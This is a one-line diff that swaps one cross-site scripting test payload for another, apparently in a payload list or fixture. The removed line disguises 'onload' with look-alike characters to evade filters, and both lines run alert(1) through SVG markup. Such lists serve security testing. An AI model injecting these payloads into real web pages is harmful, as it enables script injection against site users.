@@ -1,1 +1,1 @@
-<svg/οnlοad=alert(1)>
+<svg><script>alert(1)</script></svg>
